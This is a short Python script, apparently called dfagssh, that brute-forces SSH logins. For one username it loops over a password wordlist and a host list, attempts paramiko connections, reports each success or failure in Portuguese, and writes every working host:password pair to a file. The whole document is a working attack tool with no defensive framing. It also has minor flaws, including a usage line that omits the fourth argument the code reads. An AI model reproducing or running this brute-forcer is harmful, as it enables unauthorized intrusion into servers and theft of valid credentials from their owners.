import paramiko
import sys
host = sys.argv[1]
green = '\033[32m'
red = '\033[31m'
end = '\033[0;0m'
blue = '\033[34m'
if host == "help":
	print (blue+"  ____  _____ _    ____ ____ ____  _   _ "+end)
	print (blue+" |  _ \|  ___/ \  / ___/ ___/ ___|| | | |"+end)
	print (blue+" | | | | |_ / _ \| |  _\___ \___ \| |_| |"+end)
	print (blue+" | |_| |  _/ ___ \ |_| |___) |__) |  _  |"+end)
	print (blue+" |____/|_|/_/   \_\____|____/____/|_| |_|\n"+end)
	print("usage: dfagssh.py (hostlist.txt) (user) (passwordlist.txt)")
else:
	print (blue+"  ____  _____ _    ____ ____ ____  _   _ "+end)
	print (blue+" |  _ \|  ___/ \  / ___/ ___/ ___|| | | |"+end)
	print (blue+" | | | | |_ / _ \| |  _\___ \___ \| |_| |"+end)
	print (blue+" | |_| |  _/ ___ \ |_| |___) |__) |  _  |"+end)
	print (blue+" |____/|_|/_/   \_\____|____/____/|_| |_|\n"+end)
	user = sys.argv[2]
	arquivo = open(sys.argv[3])
	linhas = arquivo.readlines()
	arquivo2 = open(sys.argv[1])
	linhas2 = arquivo2.readlines()
	name = sys.argv [4]
	for linha in linhas:
		for linha2 in linhas2:
			try:
				fimm = len(linha2)
				fim = len(linha)
				client = paramiko.SSHClient ()
				client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				client.connect(linha2[0:fimm-1], username=user, password=linha[0:fim-1])
				print green+"[+] Acesso Granted! "+end+blue+"HOST: ", linha2 + "PASS: ", linha + end
				client.close
				adicionar = open(name, 'a')
				adicionar.write(linha2 + ":" + linha + "\n")
				adicionar.close
			except:
				print red+"[-] Acesso Denied!"+end+blue+"HOST: ", linha2 + "PASS: ", linha+end
